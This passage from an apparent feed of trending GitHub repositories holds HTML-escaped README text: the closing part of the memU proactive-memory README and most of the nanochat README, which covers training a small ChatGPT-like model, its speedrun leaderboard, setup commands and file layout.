 &lt;li&gt;Automatically extracts preferences from casual mentions&lt;/li&gt; 
 &lt;li&gt;Builds relationship models from interaction patterns&lt;/li&gt; 
 &lt;li&gt;Surfaces relevant context in future conversations&lt;/li&gt; 
 &lt;li&gt;Adapts communication style based on learned preferences&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; Personal AI assistants, customer support that remembers, social chatbots&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Example 2: Self-Improving Agent&lt;/h3&gt; 
&lt;p&gt;Learns from execution logs and proactively suggests optimizations:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_2_skill_extraction.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Monitors agent actions and outcomes continuously&lt;/li&gt; 
 &lt;li&gt;Identifies patterns in successes and failures&lt;/li&gt; 
 &lt;li&gt;Auto-generates skill guides from experience&lt;/li&gt; 
 &lt;li&gt;Proactively suggests strategies for similar future tasks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; DevOps automation, agent self-improvement, knowledge capture&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Example 3: Multimodal Context Builder&lt;/h3&gt; 
&lt;p&gt;Unifies memory across different input types for comprehensive context:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_3_multimodal_memory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Cross-references text, images, and documents automatically&lt;/li&gt; 
 &lt;li&gt;Builds unified understanding across modalities&lt;/li&gt; 
 &lt;li&gt;Surfaces visual context when discussing related topics&lt;/li&gt; 
 &lt;li&gt;Anticipates information needs by combining multiple sources&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Best for:&lt;/strong&gt; Documentation systems, learning platforms, research assistants&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìä Performance&lt;/h2&gt; 
&lt;p&gt;MemU achieves &lt;strong&gt;92.09% average accuracy&lt;/strong&gt; on the Locomo benchmark across all reasoning tasks, demonstrating reliable proactive memory operations.&lt;/p&gt; 
&lt;img width="100%" alt="benchmark" src="https://github.com/user-attachments/assets/6fec4884-94e5-4058-ad5c-baac3d7e76d9" /&gt; 
&lt;p&gt;View detailed experimental data: &lt;a href="https://github.com/NevaMind-AI/memU-experiment"&gt;memU-experiment&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üß© Ecosystem&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Repository&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Proactive Features&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU"&gt;memU&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Core proactive memory engine&lt;/td&gt; 
   &lt;td&gt;7√ó24 learning pipeline, auto-categorization&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU-server"&gt;memU-server&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Backend with continuous sync&lt;/td&gt; 
   &lt;td&gt;Real-time memory updates, webhook triggers&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;&lt;a href="https://github.com/NevaMind-AI/memU-ui"&gt;memU-ui&lt;/a&gt;&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Visual memory dashboard&lt;/td&gt; 
   &lt;td&gt;Live memory evolution monitoring&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Quick Links:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;üöÄ &lt;a href="https://app.memu.so/quick-start"&gt;Try MemU Cloud&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üìö &lt;a href="https://memu.pro/docs"&gt;API Documentation&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;üí¨ &lt;a href="https://discord.gg/memu"&gt;Discord Community&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù Partners&lt;/h2&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt;&lt;a href="https://github.com/TEN-framework/ten-framework"&gt;&lt;img src="https://avatars.githubusercontent.com/u/113095513?s=200&amp;amp;v=4" alt="Ten" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://openagents.org"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/openagents.png" alt="OpenAgents" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/milvus-io/milvus"&gt;&lt;img src="https://miro.medium.com/v2/resize:fit:2400/1*-VEGyAgcIBD62XtZWavy8w.png" alt="Milvus" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://xroute.ai/"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/xroute.png" alt="xRoute" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://jaaz.app/"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/jazz.png" alt="Jazz" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/Buddie-AI/Buddie"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/buddie.png" alt="Buddie" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/bytebase/bytebase"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/bytebase.png" alt="Bytebase" height="40" style="margin: 10px;" /&gt;&lt;/a&gt; &lt;a href="https://github.com/LazyAGI/LazyLLM"&gt;&lt;img src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/partners/LazyLLM.png" alt="LazyLLM" height="40" style="margin: 10px;" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù How to Contribute&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, adding features, or improving documentation, your help is appreciated.&lt;/p&gt; 
&lt;h3&gt;Getting Started&lt;/h3&gt; 
&lt;p&gt;To start contributing to MemU, you'll need to set up your development environment:&lt;/p&gt; 
&lt;h4&gt;Prerequisites&lt;/h4&gt; 
&lt;ul&gt; 
 &lt;li&gt;Python 3.13+&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/astral-sh/uv"&gt;uv&lt;/a&gt; (Python package manager)&lt;/li&gt; 
 &lt;li&gt;Git&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Setup Development Environment&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# 1. Fork and clone the repository
git clone https://github.com/YOUR_USERNAME/memU.git
cd memU

# 2. Install development dependencies
make install
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;make install&lt;/code&gt; command will:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Create a virtual environment using &lt;code&gt;uv&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Install all project dependencies&lt;/li&gt; 
 &lt;li&gt;Set up pre-commit hooks for code quality checks&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Running Quality Checks&lt;/h4&gt; 
&lt;p&gt;Before submitting your contribution, ensure your code passes all quality checks:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;make check
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;make check&lt;/code&gt; command runs:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Lock file verification&lt;/strong&gt;: Ensures &lt;code&gt;pyproject.toml&lt;/code&gt; consistency&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Pre-commit hooks&lt;/strong&gt;: Lints code with Ruff, formats with Black&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Type checking&lt;/strong&gt;: Runs &lt;code&gt;mypy&lt;/code&gt; for static type analysis&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Dependency analysis&lt;/strong&gt;: Uses &lt;code&gt;deptry&lt;/code&gt; to find obsolete dependencies&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Contributing Guidelines&lt;/h3&gt; 
&lt;p&gt;For detailed contribution guidelines, code standards, and development practices, please see &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/CONTRIBUTING.md"&gt;CONTRIBUTING.md&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Quick tips:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Create a new branch for each feature or bug fix&lt;/li&gt; 
 &lt;li&gt;Write clear commit messages&lt;/li&gt; 
 &lt;li&gt;Add tests for new functionality&lt;/li&gt; 
 &lt;li&gt;Update documentation as needed&lt;/li&gt; 
 &lt;li&gt;Run &lt;code&gt;make check&lt;/code&gt; before pushing&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìÑ License&lt;/h2&gt; 
&lt;p&gt;&lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/LICENSE.txt"&gt;Apache License 2.0&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üåç Community&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;GitHub Issues&lt;/strong&gt;: &lt;a href="https://github.com/NevaMind-AI/memU/issues"&gt;Report bugs &amp;amp; request features&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Discord&lt;/strong&gt;: &lt;a href="https://discord.com/invite/hQZntfGsbJ"&gt;Join the community&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;X (Twitter)&lt;/strong&gt;: &lt;a href="https://x.com/memU_ai"&gt;Follow @memU_ai&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Contact&lt;/strong&gt;: &lt;a href="mailto:info@nevamind.ai"&gt;info@nevamind.ai&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;div align="center"&gt; 
 &lt;p&gt;‚≠ê &lt;strong&gt;Star us on GitHub&lt;/strong&gt; to get notified about new releases!&lt;/p&gt; 
&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>karpathy/nanochat</title>
      <link>https://github.com/karpathy/nanochat</link>
      <description>&lt;p&gt;The best ChatGPT that $100 can buy.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;nanochat&lt;/h1&gt; 
&lt;p&gt;&lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/nanochat.png" alt="nanochat logo" /&gt; &lt;img src="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/scaling_laws_jan26.png" alt="scaling laws" /&gt;&lt;/p&gt; 
&lt;p&gt;nanochat is the simplest experimental harness for training LLMs. It is designed to run on a single GPU node, the code is minimal/hackable, and it covers all major LLM stages including tokenization, pretraining, finetuning, evaluation, inference, and a chat UI. For example, you can train your own GPT-2 capability LLM (which cost ~$43,000 to train in 2019) for only $72 (~3 hours of 8XH100 GPU node) and then talk to it in a familiar ChatGPT-like web UI. On a spot instance, the total cost can be closer to ~$20. More generally, nanochat is configured out of the box to train an entire miniseries of compute-optimal models by setting one single complexity dial: &lt;code&gt;--depth&lt;/code&gt;, the number of layers in the GPT transformer model (GPT-2 capability happens to be approximately depth 26). All other hyperparameters (the width of the transformer, number of heads, learning rate adjustments, training horizons, weight decays, ...) are calculated automatically in an optimal way.&lt;/p&gt; 
&lt;p&gt;For questions about the repo, I recommend either using &lt;a href="https://deepwiki.com/karpathy/nanochat"&gt;DeepWiki&lt;/a&gt; from Devin/Cognition to ask questions about the repo, or use the &lt;a href="https://github.com/karpathy/nanochat/discussions"&gt;Discussions tab&lt;/a&gt;, or come by the &lt;a href="https://discord.com/channels/1020383067459821711/1427295580895314031"&gt;#nanochat&lt;/a&gt; channel on Discord.&lt;/p&gt; 
&lt;h2&gt;Time-to-GPT-2 Leaderboard&lt;/h2&gt; 
&lt;p&gt;Presently, the main focus of development is on tuning the pretraining stage, which takes the most amount of compute. Inspired by the modded-nanogpt repo and to incentivise progress and community collaboration, nanochat maintains a leaderboard for a "GPT-2 speedrun", which is the wall-clock time required to train a nanochat model to GPT-2 grade capability, as measured by the DCLM CORE score. The &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt; script always reflects the reference way to train GPT-2 grade model and talk to it. The current leaderboard looks as follows:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;#&lt;/th&gt; 
   &lt;th&gt;time&lt;/th&gt; 
   &lt;th&gt;val_bpb&lt;/th&gt; 
   &lt;th&gt;CORE&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
   &lt;th&gt;Date&lt;/th&gt; 
   &lt;th&gt;Commit&lt;/th&gt; 
   &lt;th&gt;Contributors&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;0&lt;/td&gt; 
   &lt;td&gt;168 hours&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;0.2565&lt;/td&gt; 
   &lt;td&gt;Original OpenAI GPT-2 checkpoint&lt;/td&gt; 
   &lt;td&gt;2019&lt;/td&gt; 
   &lt;td&gt;-&lt;/td&gt; 
   &lt;td&gt;OpenAI&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;1&lt;/td&gt; 
   &lt;td&gt;3.04&lt;/td&gt; 
   &lt;td&gt;0.74833&lt;/td&gt; 
   &lt;td&gt;0.2585&lt;/td&gt; 
   &lt;td&gt;d24 baseline, slightly overtrained&lt;/td&gt; 
   &lt;td&gt;Jan 29 2026&lt;/td&gt; 
   &lt;td&gt;348fbb3&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;2&lt;/td&gt; 
   &lt;td&gt;2.91&lt;/td&gt; 
   &lt;td&gt;0.74504&lt;/td&gt; 
   &lt;td&gt;0.2578&lt;/td&gt; 
   &lt;td&gt;d26 slightly undertrained &lt;strong&gt;+fp8&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Feb 2 2026&lt;/td&gt; 
   &lt;td&gt;a67eba3&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;3&lt;/td&gt; 
   &lt;td&gt;2.76&lt;/td&gt; 
   &lt;td&gt;0.74645&lt;/td&gt; 
   &lt;td&gt;0.2602&lt;/td&gt; 
   &lt;td&gt;bump total batch size to 1M tokens&lt;/td&gt; 
   &lt;td&gt;Feb 5 2026&lt;/td&gt; 
   &lt;td&gt;2c062aa&lt;/td&gt; 
   &lt;td&gt;@karpathy&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;The primary metric we care about is "time to GPT-2" - the wall clock time needed to outperform the GPT-2 (1.6B) CORE metric on an 8XH100 GPU node. The GPT-2 CORE score is 0.256525. In 2019, the training of GPT-2 cost approximately $43,000 so it is incredible that due to many advances over 7 years across the stack, we can now do so much faster and for well below $100 (e.g. at the current ~$3/GPU/hr, an 8XH100 node is ~$24/hr, so 3 hours is ~$72).&lt;/p&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/dev/LEADERBOARD.md"&gt;dev/LEADERBOARD.md&lt;/a&gt; for more docs on how to interpret and contribute to the leaderboard.&lt;/p&gt; 
&lt;h2&gt;Getting started&lt;/h2&gt; 
&lt;h3&gt;Reproduce and talk to GPT-2&lt;/h3&gt; 
&lt;p&gt;The most fun you can have is to train your own GPT-2 and talk to it. The entire pipeline to do so is contained in the single file &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/speedrun.sh"&gt;runs/speedrun.sh&lt;/a&gt;, which is designed to be run on an 8XH100 GPU node. Boot up a new 8XH100 GPU box from your favorite provider (e.g. I use and like &lt;a href="https://lambda.ai/service/gpu-cloud"&gt;Lambda&lt;/a&gt;), and kick off the training script:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;bash runs/speedrun.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You may wish to do so in a screen session as this will take ~3 hours to run. Once it's done, you can talk to it via the ChatGPT-like web UI. Make sure again that your local uv virtual environment is active (run &lt;code&gt;source .venv/bin/activate&lt;/code&gt;), and serve it:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python -m scripts.chat_web
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;And then visit the URL shown. Make sure to access it correctly, e.g. on Lambda use the public IP of the node you're on, followed by the port, so for example &lt;a href="http://209.20.xxx.xxx:8000/"&gt;http://209.20.xxx.xxx:8000/&lt;/a&gt;, etc. Then talk to your LLM as you'd normally talk to ChatGPT! Get it to write stories or poems. Ask it to tell you who you are to see a hallucination. Ask it why the sky is blue. Or why it's green. The speedrun is a 4e19 FLOPs capability model so it's a bit like talking to a kindergartener :).&lt;/p&gt; 
&lt;hr /&gt; 
&lt;img width="2672" height="1520" alt="image" src="https://github.com/user-attachments/assets/ed39ddf8-2370-437a-bedc-0f39781e76b5" /&gt; 
&lt;hr /&gt; 
&lt;p&gt;A few more notes:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;The code will run just fine on the Ampere 8XA100 GPU node as well, but a bit slower.&lt;/li&gt; 
 &lt;li&gt;All code will run just fine on even a single GPU by omitting &lt;code&gt;torchrun&lt;/code&gt;, and will produce ~identical results (code will automatically switch to gradient accumulation), but you'll have to wait 8 times longer.&lt;/li&gt; 
 &lt;li&gt;If your GPU(s) have less than 80GB, you'll have to tune some of the hyperparameters or you will OOM / run out of VRAM. Look for &lt;code&gt;--device_batch_size&lt;/code&gt; in the scripts and reduce it until things fit. E.g. from 32 (default) to 16, 8, 4, 2, or even 1. Less than that you'll have to know a bit more what you're doing and get more creative.&lt;/li&gt; 
 &lt;li&gt;Most of the code is fairly vanilla PyTorch so it should run on anything that supports that - xpu, mps, or etc, but I haven't personally exercised all of these code paths so there might be sharp edges.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Research&lt;/h2&gt; 
&lt;p&gt;If you are a researcher and wish to help improve nanochat, two scripts of interest are &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/scaling_laws.sh"&gt;runs/scaling_laws.sh&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/miniseries.sh"&gt;runs/miniseries.sh&lt;/a&gt;. See &lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; for related documentation. For quick experimentation (~5 min pretraining runs) my favorite scale is to train a 12-layer model (GPT-1 sized), e.g. like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;OMP_NUM_THREADS=1 torchrun --standalone --nproc_per_node=8 -m scripts.base_train -- \
    --depth=12 \
    --run="d12" \
    --model-tag="d12" \
    --core-metric-every=999999 \
    --sample-every=-1 \
    --save-every=-1 \
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This uses wandb (run name "d12"), only runs the CORE metric on last step, and it doesn't sample and save intermediate checkpoints. I like to change something in the code, re-run a d12 (or a d16 etc) and see if it helped, in an iteration loop. To see if a run helps, I like to monitor the wandb plots for:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;code&gt;val_bpb&lt;/code&gt; (validation loss in vocab-size-invariant units of bits per byte) as a function of &lt;code&gt;step&lt;/code&gt;, &lt;code&gt;total_training_time&lt;/code&gt; and &lt;code&gt;total_training_flops&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;core_metric&lt;/code&gt; (the DCLM CORE socre)&lt;/li&gt; 
 &lt;li&gt;VRAM utilization, &lt;code&gt;train/mfu&lt;/code&gt; (Model FLOPS utilization), &lt;code&gt;train/tok_per_sec&lt;/code&gt; (training throughput)&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;See an example &lt;a href="https://github.com/karpathy/nanochat/pull/498#issuecomment-3850720044"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The important thing to note is that nanochat is written and configured around one single dial of complexity - the depth of the transformer. This single integer automatically determines all other hyperparameters (the width of the transformer, number of heads, learning rate adjustments, training horizons, weight decays, ...) so that the trained model comes out compute optimal. The idea is that the user doesn't have to think about or set any of this, they are simply asking for a smaller or bigger model using &lt;code&gt;--depth&lt;/code&gt;, and everything "just works". By sweeping out the depth, you achieve the nanochat miniseries of compute optimal models at various sizes. GPT-2 capability model (which is of most interest at the moment) happens to be somewhere around d24-d26 range with the current code. But any candidate changes to the repo have to be principled enough that they work for all settings of depth.&lt;/p&gt; 
&lt;h2&gt;Running on CPU / MPS&lt;/h2&gt; 
&lt;p&gt;The script &lt;a href="https://raw.githubusercontent.com/karpathy/nanochat/master/runs/runcpu.sh"&gt;runs/runcpu.sh&lt;/a&gt; shows a very simple example of running on CPU or Apple Silicon. It dramatically shrinks the LLM that is being trained to make things fit into a reasonable time interval of a few ten minutes of training. You will not get strong results in this way.&lt;/p&gt; 
&lt;h2&gt;Guides&lt;/h2&gt; 
&lt;p&gt;I've published a number of guides that might contain helpful information, most recent to least recent:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/481"&gt;Feb 1 2026: Beating GPT-2 for &amp;lt;&amp;lt;$100: the nanochat journey&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/420"&gt;Jan 7 miniseries v1&lt;/a&gt; documents the first nanochat miniseries of models.&lt;/li&gt; 
 &lt;li&gt;To add new abilities to nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/164"&gt;Guide: counting r in strawberry (and how to add abilities generally)&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;To customize your nanochat, see &lt;a href="https://github.com/karpathy/nanochat/discussions/139"&gt;Guide: infusing identity to your nanochat&lt;/a&gt; in Discussions, which describes how you can tune your nanochat's personality through synthetic data generation and mixing that data into the SFT stage.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/karpathy/nanochat/discussions/1"&gt;Oct 13 2025: original nanochat post&lt;/a&gt; introducing nanochat, though now it contains some deprecated information and the model is a lot older (with worse results) than current master.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;File structure&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;.
‚îú‚îÄ‚îÄ LICENSE
‚îú‚îÄ‚îÄ README.md
‚îú‚îÄ‚îÄ dev
‚îÇ   ‚îú‚îÄ‚îÄ gen_synthetic_data.py       # Example synthetic data for identity
‚îÇ   ‚îú‚îÄ‚îÄ generate_logo.html
‚îÇ   ‚îú‚îÄ‚îÄ nanochat.png
‚îÇ   ‚îî‚îÄ‚îÄ repackage_data_reference.py # Pretraining data shard generation
‚îú‚îÄ‚îÄ nanochat
‚îÇ   ‚îú‚îÄ‚îÄ __init__.py                 # empty
‚îÇ   ‚îú‚îÄ‚îÄ checkpoint_manager.py       # Save/Load model checkpoints
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # Misc small utilities, quality of life
‚îÇ   ‚îú‚îÄ‚îÄ core_eval.py                # Evaluates base model CORE score (DCLM paper)
‚îÇ   ‚îú‚îÄ‚îÄ dataloader.py               # Tokenizing Distributed Data Loader
‚îÇ   ‚îú‚îÄ‚îÄ dataset.py                  # Download/read utils for pretraining data
‚îÇ   ‚îú‚îÄ‚îÄ engine.py                   # Efficient model inference with KV Cache
‚îÇ   ‚îú‚îÄ‚îÄ execution.py                # Allows the LLM to execute Python code as tool
‚îÇ   ‚îú‚îÄ‚îÄ gpt.py                      # The GPT nn.Module Transformer
‚îÇ   ‚îú‚îÄ‚îÄ logo.svg
‚îÇ   ‚îú‚îÄ‚îÄ loss_eval.py                # Evaluate bits per byte (instead of loss)
‚îÇ   ‚îú‚îÄ‚îÄ optim.py                    # AdamW + Muon optimizer, 1GPU and distributed
‚îÇ   ‚îú‚îÄ‚îÄ report.py                   # Utilities for writing the nanochat Report
‚îÇ   ‚îú‚îÄ‚îÄ tokenizer.py                # BPE Tokenizer wrapper in style of GPT-4
‚îÇ   ‚îî‚îÄ‚îÄ ui.html                     # HTML/CSS/JS for nanochat frontend
‚îú‚îÄ‚îÄ pyproject.toml
‚îú‚îÄ‚îÄ runs
‚îÇ   ‚îú‚îÄ‚îÄ miniseries.sh               # Miniseries training script
‚îÇ   ‚îú‚îÄ‚îÄ runcpu.sh                   # Small example of how to run on CPU/MPS
‚îÇ   ‚îú‚îÄ‚îÄ scaling_laws.sh             # Scaling laws experiments
‚îÇ   ‚îî‚îÄ‚îÄ speedrun.sh                 # Train the ~$100 nanochat d20
‚îú‚îÄ‚îÄ scripts
‚îÇ   ‚îú‚îÄ‚îÄ base_eval.py                # Base model: CORE score, bits per byte, samples
‚îÇ   ‚îú‚îÄ‚îÄ base_train.py               # Base model: train
‚îÇ   ‚îú‚îÄ‚îÄ chat_cli.py                 # Chat model: talk to over CLI
‚îÇ   ‚îú‚îÄ‚îÄ chat_eval.py                # Chat model: eval tasks
‚îÇ   ‚îú‚îÄ‚îÄ chat_rl.py                  # Chat model: reinforcement learning
‚îÇ   ‚îú‚îÄ‚îÄ chat_sft.py                 # Chat model: train SFT
‚îÇ   ‚îú‚îÄ‚îÄ chat_web.py                 # Chat model: talk to over WebUI
‚îÇ   ‚îú‚îÄ‚îÄ tok_eval.py                 # Tokenizer: evaluate compression rate
‚îÇ   ‚îî‚îÄ‚îÄ tok_train.py                # Tokenizer: train it
‚îú‚îÄ‚îÄ tasks
‚îÇ   ‚îú‚îÄ‚îÄ arc.py                      # Multiple choice science questions
‚îÇ   ‚îú‚îÄ‚îÄ common.py                   # TaskMixture | TaskSequence
‚îÇ   ‚îú‚îÄ‚îÄ customjson.py               # Make Task from arbitrary jsonl convos
‚îÇ   ‚îú‚îÄ‚îÄ gsm8k.py                    # 8K Grade School Math questions
‚îÇ   ‚îú‚îÄ‚îÄ humaneval.py                # Misnomer; Simple Python coding task
‚îÇ   ‚îú‚îÄ‚îÄ mmlu.py                     # Multiple choice questions, broad topics
‚îÇ   ‚îú‚îÄ‚îÄ smoltalk.py                 # Conglomerate dataset of SmolTalk from HF
‚îÇ   ‚îî‚îÄ‚îÄ spellingbee.py              # Task teaching model to spell/count letters
‚îú‚îÄ‚îÄ tests
‚îÇ   ‚îî‚îÄ‚îÄ test_engine.py
‚îî‚îÄ‚îÄ uv.lock
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;p&gt;The goal of nanochat is to improve the state of the art in micro models that are accessible to work with end to end on budgets of &amp;lt; $1000 dollars. Accessibility is about overall cost but also about cognitive complexity - nanochat is not an exhaustively configurable LLM "framework"; there are no giant configuration objects, model factories, or if-then-else monsters in the code base. It is a single, cohesive, minimal, readable, hackable, maximally-forkable "strong baseline" codebase designed to run start to end and produce a ChatGPT model you can talk to. Currently, the most interesting part personally is speeding up the latency to GPT-2 (i.e. getting a CORE score above 0.256525). Currently this takes ~3 hours, but by improving the pretraining stage we can improve this further.&lt;/p&gt; 
&lt;p&gt;Current AI policy: disclosure. When submitting a PR, please declare any parts that had substantial LLM contribution and that you have not written or that you do not fully understand.&lt;/p&gt; 
&lt;h2&gt;Acknowledgements&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;The name (nanochat) derives from my earlier project &lt;a href="https://github.com/karpathy/nanoGPT"&gt;nanoGPT&lt;/a&gt;, which only covered pretraining.&lt;/li&gt; 
 &lt;li&gt;nanochat is also inspired by &lt;a href="https://github.com/KellerJordan/modded-nanogpt"&gt;modded-nanoGPT&lt;/a&gt;, which gamified the nanoGPT repo with clear metrics and a leaderboard, and borrows a lot of its ideas and some implementation for pretraining.&lt;/li&gt; 
 &lt;li&gt;Thank you to &lt;a href="https://huggingface.co/"&gt;HuggingFace&lt;/a&gt; for fineweb and smoltalk.&lt;/li&gt; 
